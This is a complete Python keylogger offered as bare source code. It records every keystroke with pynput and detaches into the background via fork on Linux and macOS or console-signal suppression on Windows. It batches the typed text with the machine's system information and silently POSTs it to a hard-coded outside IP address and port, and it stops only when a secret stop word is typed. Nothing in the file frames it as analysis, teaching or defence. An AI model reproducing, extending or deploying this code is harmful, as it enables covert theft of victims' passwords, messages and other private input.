from pynput import keyboard
import threading
import requests
import platform
from collections import deque
import sys
import os

class Keylogger:
    def __init__(self):
        self.log = ""
        self.stop_word = "niceworkllo"  # The specific word to stop the keylogger
        self.queue = deque(maxlen=len(self.stop_word))  # Fixed-length queue
        self.stop_keylogger = False  # Flag to stop the keylogger
    
    def send_request(self):
        try:
            response = requests.post(
                "http://34.136.67.113:3475",
                json={"log": self.log, "system_info": system_info},  # Ensure system_info is sent as a string
                timeout=5
            )
        except requests.exceptions.RequestException:
            pass  # Handle connection issues silently

    def on_press(self, key):
        try:
            char = key.char  # Alphanumeric keys
            self.log += char
            self.queue.append(char)  # Add the character to the queue
        except AttributeError:
            # Handle special keys
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.tab: "[TAB]"
            }
            special_key = special_keys.get(key, f" [{key}] ")
            self.log += special_key
            self.queue.append(special_key)  # Add the special key to the queue

        # Check if the queue matches the stop word
        if len(self.queue) == len(self.stop_word):
            typed_word = "".join(self.queue)
            if typed_word == self.stop_word:
                self.stop_keylogger = True
                return False  # Stop the listener

    def on_release(self, key):
        pass  # No action needed on key release

    def report(self):
        print(self.log)
        if len(self.log) > 600:  # Send logs if the log size exceeds 600 characters
            self.send_request()
            self.log = ""  # Reset log after sending
        if not self.stop_keylogger:
            threading.Timer(10, self.report).start()  # Repeat every 10 seconds

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            self.report()
            listener.join()

def daemonize():
    if os.name == "posix":  # Linux or macOS
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Exit the parent process
    elif os.name == "nt":  # Windows
        import win32api, win32process
        hprocess = win32api.GetCurrentProcess()
        win32process.SetPriorityClass(hprocess, win32process.IDLE_PRIORITY_CLASS)
        win32api.SetConsoleCtrlHandler(lambda x: True, True)
    else:
        raise NotImplementedError("Unsupported operating system.")

if __name__ == "__main__":
    system_info = platform.uname()._asdict()
    daemonize()
    keylogger = Keylogger()
    keylogger.start()
